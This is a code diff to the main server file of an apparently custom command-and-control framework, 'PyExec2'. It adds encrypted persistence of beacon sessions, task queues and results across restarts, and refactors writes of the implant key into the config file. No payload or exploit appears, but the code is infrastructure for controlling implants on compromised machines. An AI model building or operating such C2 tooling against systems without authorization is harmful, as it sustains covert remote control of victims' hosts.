@@ -14,7 +14,6 @@ server/server.py — PyExec2 C2 Server 主入口（T4.5 重构）
 """
 
 import argparse
-import json
 import logging
 import os
 import secrets
@@ -41,7 +40,7 @@ if _PKG_NAME != "server" and "server" not in sys.modules:
     except Exception:
         pass  # 交给下方 import 报出原始错误
 
-from server.core.config import load_config, ServerConfig, _is_hex64
+from server.core.config import load_config, ServerConfig, _is_hex64, update_config_file
 from server.core.log import setup_logging, get_logger
 from server.core.events import (
     EVT_SERVER_START, EVT_SERVER_STOP, EVT_DISCONNECT,
@@ -51,7 +50,9 @@ from server.task_queue import TaskQueue
 from server.infra.event_writer import EventWriter
 from server.module_loader import ModuleLoader
 from server.listener import Listener
+from server.core.state_store import StatePersister, StateStore, ensure_state_key
 from server.sessions.beacon import BeaconSession
+from server.sessions.engine import InFlight
 from server.sessions.client import ClientSession
 from server.ui.console import Console, console_loop
 from server.server_module_loader import ServerModuleLoader
@@ -70,14 +71,7 @@ def _ensure_implant_key(config: ServerConfig) -> bytes:
                    if config.base_dir else "config.json")
     logger.warning("implant_key 为空或无效，已自动生成 %s", key.hex())
     try:
-        try:
-            with open(config_file, "r", encoding="utf-8") as f:
-                raw = json.load(f)
-        except FileNotFoundError:
-            raw = {}
-        raw["implant_key"] = key.hex()
-        with open(config_file, "w", encoding="utf-8") as f:
-            json.dump(raw, f, indent=2)
+        update_config_file(config_file, implant_key=key.hex())
         logger.info("implant_key 已写入 %s", config_file)
     except Exception as e:
         logger.error("写回 config 失败: %s", e)
@@ -119,6 +113,23 @@ class PyExec2Server:
             max_results_per_beacon=config.max_results_per_beacon)
         self._tq = TaskQueue(max_tasks_per_client=config.max_tasks_per_client)
         self._events = EventWriter(config.event_file)
+
+        # 运行态加密落盘(2026-09-28):beacon↔记录、结果、待办队列、在途登记
+        # 重启后不再丢。无配置文件路径(内存构造的 config, 如测试)时自动关闭,
+        # 免得往当前工作目录乱写。
+        self._inflight = InFlight()
+        self._mgr._inflight = self._inflight          # session 侧共享同一份
+        self._persister = None
+        if config.config_path or config.base_dir:
+            try:
+                self._persister = StatePersister(
+                    StateStore(config.state_file, ensure_state_key(config)),
+                    self._mgr, self._tq, self._inflight)
+                self._persister.load()
+                self._persister.attach()
+            except Exception as exc:                # pragma: no cover - 兜底
+                logger.error("运行态落盘初始化失败(继续以内存态运行): %s", exc)
+                self._persister = None
 
         self._modules = ModuleLoader(
             modules_dir=config.modules_dir,
@@ -163,6 +174,8 @@ class PyExec2Server:
         self._start_cleanup()
         self._start_listener()
         self._start_udp_heartbeat()
+        if self._persister is not None:
+            self._persister.start()
 
         if self._headless:
             logger.info("headless mode: 事件写 %s，运行日志见 log_file。"
@@ -193,6 +206,11 @@ class PyExec2Server:
                 pass
         if self._console:
             self._console.stop()
+        if self._persister is not None:
+            try:
+                self._persister.stop()  # 停线程 + 最后 flush 一次(重启不丢)
+            except Exception as exc:    # noqa: BLE001 - 关停收尾不得因它中断
+                logger.error("运行态保存收尾失败(不影响停止): %s", exc)
         self._events.emit(EVT_SERVER_STOP, "-")
         logger.info("server stopped")
 
@@ -386,8 +404,7 @@ def main():
         defaults = {f.name: getattr(config, f.name)
                     for f in ServerConfig.__dataclass_fields__.values()
                     if f.name != "config_path"}
-        with open(config_path, "w") as f:
-            json.dump(defaults, f, indent=2)
+        update_config_file(config_path, **defaults)
 
     # --port/--host 覆盖先于 validate()：非法端口在 bind 前优雅报错退出
     if args.port:
